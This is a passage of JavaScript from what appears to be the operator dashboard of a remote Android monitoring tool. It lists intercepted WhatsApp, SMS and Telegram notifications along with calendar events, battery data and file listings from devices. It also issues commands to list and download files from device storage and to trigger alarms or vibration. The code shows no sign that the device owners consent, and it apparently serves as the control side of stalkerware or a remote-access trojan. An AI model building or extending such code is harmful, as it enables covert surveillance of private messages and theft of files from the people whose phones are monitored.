    all.push(...n.map(x => ({ ...x, device_name: d.device_name || d.id.substring(0, 12) })));
  }
  all.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
  const container = document.getElementById('notifList');
  if (all.length === 0) { container.innerHTML = '<div class="empty-state">No notifications yet. Enable Notification Access on device.</div>'; return; }
  container.innerHTML = `<table><thead><tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Time</th><th></th></tr></thead><tbody>
    ${all.slice(0, 200).map(n => {
      const cls = getNotifBadgeClass(n.app_name || n.app_package);
      const key = `${n.device_id}|${n.sender}|${n.message}|${n.timestamp}`;
      seenNotifIds.add(key);
      return `<tr><td>${n.device_name}</td><td><span class="notif-app-badge ${cls}">${n.app_name || n.app_package}</span></td><td>${n.sender || '-'}</td><td><div class="notif-message">${escapeHtml(n.message || '')}</div></td><td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td><td><button class="row-delete" onclick="deleteNotification('${n.id}')">Delete</button></td></tr>`;
    }).join('')}
  </tbody></table>`;
}

function getNotifBadgeClass(name) {
  if (!name) return '';
  const l = name.toLowerCase();
  if (l.includes('whatsapp')) return 'whatsapp';
  if (l.includes('message') || l.includes('sms') || l.includes('mms')) return 'sms';
  if (l.includes('telegram')) return 'telegram';
  return '';
}
function escapeHtml(t) { const d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
async function deleteNotification(id) { try { await fetch(`${API_BASE}/api/notifications/${id}`, { method: 'DELETE' }); refreshNotifications(); } catch (_) { showToast('Failed', true); } }
async function clearAllNotifications() { showConfirm('Clear All Notifications', 'Delete all notifications for all devices?', async () => { try { const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json()); for (const d of devices) await fetch(`${API_BASE}/api/device/${d.id}/notifications`, { method: 'DELETE' }); showToast('Cleared'); refreshNotifications(); refreshStats(); } catch (_) { showToast('Failed', true); } }); }

async function loadDeviceNotifications(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/notifications`);
    const notifs = await res.json();
    const container = document.getElementById('deviceNotifications');
    if (notifs.length === 0) { container.innerHTML = '<div class="empty-state">No notifications</div>'; return; }
    container.innerHTML = `<table><thead><tr><th>App</th><th>Sender</th><th>Message</th><th>Time</th></tr></thead><tbody>
      ${notifs.slice(0, 50).map(n => {
        const cls = getNotifBadgeClass(n.app_name || n.app_package);
        return `<tr><td><span class="notif-app-badge ${cls}">${n.app_name || n.app_package}</span></td><td>${n.sender || '-'}</td><td><div class="notif-message">${escapeHtml(n.message || '')}</div></td><td style="white-space:nowrap">${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td></tr>`;
      }).join('')}
    </tbody></table>`;
  } catch (_) {}
}
async function deleteDeviceNotifications() { if (!selectedDevice) return; try { await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' }); showToast('Cleared'); loadDeviceNotifications(selectedDevice); refreshStats(); } catch (_) { showToast('Failed', true); } }

// ===== New Feature Commands =====
function sendAlarm() {
  const ms = prompt('Alarm duration (ms):', '15000');
  if (ms) sendCommand('PLAY_ALARM', { duration_ms: parseInt(ms) || 15000 });
}
function sendVibrate() {
  const ms = prompt('Vibrate duration (ms):', '10000');
  if (ms) sendCommand('VIBRATE_DEVICE', { duration_ms: parseInt(ms) || 10000 });
}
function listFiles() {
  const path = prompt('Directory path:', '/storage/emulated/0');
  if (path) sendCommand('LIST_FILES', { path });
}
function sendDownloadFile(filePath) {
  sendCommand('DOWNLOAD_FILE', { file_path: filePath });
}
function refreshBattery() {
  sendCommand('GET_BATTERY');
}
function fetchCalendar() {
  sendCommand('GET_CALENDAR');
}

let batteryRefreshTimer = null;
function startBatteryAutoRefresh() {
  stopBatteryAutoRefresh();
  refreshBattery();
  batteryRefreshTimer = setInterval(refreshBattery, 30000);
}
function stopBatteryAutoRefresh() {
  if (batteryRefreshTimer) { clearInterval(batteryRefreshTimer); batteryRefreshTimer = null; }
}

async function loadBatteryHistory(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/battery`);
    const data = await res.json();
    const container = document.getElementById('batteryHistory');
    if (!container) return;
    if (data.length === 0) { container.innerHTML = '<div class="empty-state">No battery data yet</div>'; return; }
    const latest = data[0];
    document.getElementById('batteryLevel').textContent = latest.level + '%';
    document.getElementById('batteryCharging').textContent = latest.is_charging ? 'Charging' : 'Not Charging';
    document.getElementById('batteryHealth').textContent = latest.health || 'unknown';
    document.getElementById('batteryTemp').textContent = latest.temperature ? latest.temperature + '°C' : '-';
    document.getElementById('batteryTech').textContent = latest.technology || '-';
    container.innerHTML = `<table><thead><tr><th>Level</th><th>Charging</th><th>Temp</th><th>Time</th></tr></thead><tbody>
      ${data.slice(0, 20).map(b => `<tr><td>${b.level}%</td><td>${b.is_charging ? 'Yes' : 'No'}</td><td>${b.temperature ? b.temperature + '°C' : '-'}</td><td>${new Date(b.created_at).toLocaleString()}</td></tr>`).join('')}
    </tbody></table>`;
  } catch (_) {}
}

async function loadCalendarEvents(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/calendar`);
    const data = await res.json();
    const container = document.getElementById('calendarEvents');
    if (!container) return;
    if (data.length === 0) { container.innerHTML = '<div class="empty-state">No calendar events found</div>'; return; }
    container.innerHTML = `<table><thead><tr><th>Title</th><th>Date</th><th>Location</th></tr></thead><tbody>
      ${data.slice(0, 50).map(e => `<tr><td>${escapeHtml(e.title || '')}</td><td>${e.start_time ? new Date(e.start_time).toLocaleString() : '-'}</td><td>${escapeHtml(e.event_location || '-')}</td></tr>`).join('')}
    </tbody></table>`;
  } catch (_) {}
}

async function loadDeviceFiles(deviceId) {
  try {
    const res = await fetch(`${API_BASE}/api/device/${deviceId}/files`);
    const data = await res.json();
    const container = document.getElementById('deviceFiles');
    if (!container) return;
    if (data.length === 0) { container.innerHTML = '<div class="empty-state">No file data. Send LIST_FILES command first.</div>'; return; }
    container.innerHTML = `<table><thead><tr><th>Name</th><th>Size</th><th>Type</th><th></th></tr></thead><tbody>
      ${data.slice(0, 100).map(f => `<tr><td>${f.is_directory ? '📁 ' : '📄 '}${escapeHtml(f.file_name)}</td><td>${f.is_directory ? '-' : formatFileSize(f.file_size)}</td><td>${f.mime_type || '-'}</td><td>${!f.is_directory && f.file_size > 0 && f.file_size <= 20971520 ? `<button class="btn btn-glass btn-sm" onclick="sendDownloadFile('${f.file_path.replace(/'/g, "\\'")}')">DL</button>` : ''}</td></tr>`).join('')}
    </tbody></table>`;
  } catch (_) {}
}

function formatFileSize(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / 1048576).toFixed(1) + ' MB';
}

// ===== Toast =====
function showToast(message, isError = false) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.className = isError ? 'toast error' : 'toast';
  toast.classList.remove('hidden');
  setTimeout(() => toast.classList.add('hidden'), 4000);
}
